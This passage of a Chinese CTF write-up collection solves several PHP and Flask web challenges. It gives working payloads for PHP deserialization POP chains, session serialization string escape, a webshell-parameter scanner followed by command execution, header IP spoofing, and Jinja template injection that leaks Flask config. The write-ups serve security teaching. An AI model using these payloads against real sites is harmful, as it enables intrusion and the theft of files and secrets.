    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
} 
```

payload

```php
<?php
class Modifier {
    protected  $var = "php://filter/convert.base64-encode/resource=flag.php";
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

$a = new Show();
$a->source = new Show();
$a->source->str = new Test();
$a->source->str->p = new Modifier();
echo urlencode(serialize($a));
```

整个流程

![](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240218163744126.png)

## [强网杯 2019]高明的黑客

找到了利用文件： xk0SzyKwfzw.php  and 找到了利用的参数：Efa5BVG

```python
import os
import requests
import re
import threading
import time
print('开始时间：  '+  time.asctime( time.localtime(time.time()) ))
s1=threading.Semaphore(50)                                            #这儿设置最大的线程数
filePath = r"D:\phpstudy_pro\WWW\src"
os.chdir(filePath)                                                    #改变当前的路径
requests.adapters.DEFAULT_RETRIES = 5                                #设置重连次数，防止线程数过高，断开连接
files = os.listdir(filePath)
session = requests.Session()
session.keep_alive = False                                             # 设置连接活跃状态为False
def get_content(file):
    s1.acquire()
    print('trying   '+file+ '     '+ time.asctime( time.localtime(time.time()) ))
    with open(file,encoding='utf-8') as f:                            #打开php文件，提取所有的$_GET和$_POST的参数
            gets = list(re.findall('\$_GET\[\'(.*?)\'\]', f.read()))
            posts = list(re.findall('\$_POST\[\'(.*?)\'\]', f.read()))
    data = {}                                                        #所有的$_POST
    params = {}                                                        #所有的$_GET
    for m in gets:
        params[m] = "echo 'xxxxxx';"
    for n in posts:
        data[n] = "echo 'xxxxxx';"
    url = 'http://127.0.0.1/src/'+file
    req = session.post(url, data=data, params=params)            #一次性请求所有的GET和POST
    req.close()                                                # 关闭请求  释放内存
    req.encoding = 'utf-8'
    content = req.text
    #print(content)
    if "xxxxxx" in content:                                    #如果发现有可以利用的参数，继续筛选出具体的参数
        flag = 0
        for a in gets:
            req = session.get(url+'?%s='%a+"echo 'xxxxxx';")
            content = req.text
            req.close()                                                # 关闭请求  释放内存
            if "xxxxxx" in content:
                flag = 1
                break
        if flag != 1:
            for b in posts:
                req = session.post(url, data={b:"echo 'xxxxxx';"})
                content = req.text
                req.close()                                                # 关闭请求  释放内存
                if "xxxxxx" in content:
                    break
        if flag == 1:                                                    #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，
            param = a
        else:
            param = b
        print('找到了利用文件： '+file+"  and 找到了利用的参数：%s" %param)
        print('结束时间：  ' + time.asctime(time.localtime(time.time())))
    s1.release()

for i in files:                                                            #加入多线程
   t = threading.Thread(target=get_content, args=(i,))
   t.start()
```

payload

```
/xk0SzyKwfzw.php?Efa5BVG=cat /flag
```

## [安洵杯 2019]easy_serialize_php

```php
 <?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

可控参数有

f，user，function(这里可以利用extract函数进行变量覆盖)

我们查看一下phpinfo里面，发现有个d0g3_f1ag.php文件

基本思路就有了

```
使$userinfo['img']等于ZDBnM19mMWFnLnBocA==，读取d0g3_f1ag.php文件的内容
```

`$_SESSION['img'] = sha1(base64_encode($_GET['img_path']));`这里进行sha1加密就不能base64

解码，所以只能走if这条路

发现这个函数`preg_replace`，想到了可以进行字符串逃逸

我们将变量赋值为

```php
$_SESSION["user"] = 'guest';
$_SESSION['function'] = '11';
$_SESSION['img'] = base64_encode('d0g3_f1ag.php');
```

序列化结果

```
a:3:{s:4:"user";s:5:"guest";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

如果想让img参数进行解析，我们需要吃的字符串是`";s:8:"function";s:2:"11`24个字符，6个flag正好是24个字符

赋值

```php
$_SESSION["user"] = 'guestflagflagflagflagflagflag';
$_SESSION['function'] = '11';
$_SESSION['img'] = base64_encode('d0g3_f1ag.php');
```

序列化结果

```
a:3:{s:4:"user";s:29:"guest";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

这样img参数就可以解析，但function参数没了，我们要加上function参数

赋值

```php
$_SESSION["user"] = 'guestflagflagflagflagflagflag';
$_SESSION['function'] = '";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
$_SESSION['img'] = base64_encode('d0g3_f1ag.php');
```

序列化结果

```
a:3:{s:4:"user";s:29:"guest";s:8:"function";s:65:"";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

在user变量里，会多吃一个`"`,即`guest";s:8:"function";s:65:""`这样才是29个字符，我们需要在function参数前多加一个字符

```
$_SESSION['function'] = 'a";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
```

序列化结果

```
a:3:{s:4:"user";s:29:"guest";s:8:"function";s:66:"a";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

这样就都能被解析了

payload

```
GET传参:
f=show_image
POST传参:
_SESSION[user]=guestflagflagflagflagflagflag&_SESSION[function]=a";s:8:"function";s:2:"11";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
```

d0g3_f1ag.php文件的内容是

```php
<?php

$flag = 'flag in /d0g3_fllllllag';

?>
```

同样读取/d0g3_fllllllag文件

```php
<?php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$_SESSION["user"] = 'guestflagflagflagflagflagflag';
$_SESSION['function'] = 'a";s:8:"function";s:2:"11";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}';
$_SESSION['img'] = base64_encode('d0g3_f1ag.php');


$serialize_info = filter(serialize($_SESSION));
echo $serialize_info;
```

## [MRCTF2020]PYWebsite

发现源码里有flag.php

访问flag.php

> 我已经把购买者的IP保存了，显然你没有购买
>
> 验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag

提示和ip有关，添加http头试试

```
X-Forwarded-For: 127.0.0.1
```

flag就出来了

## [WesternCTF2018]shrine

```python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)
```

```
app.config['FLAG'] = os.environ.pop('FLAG')
在app的config内定义了FLAG参数，参数的值为os环境变量的FLAG值，读取config就行了
```

payload

```
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}
```

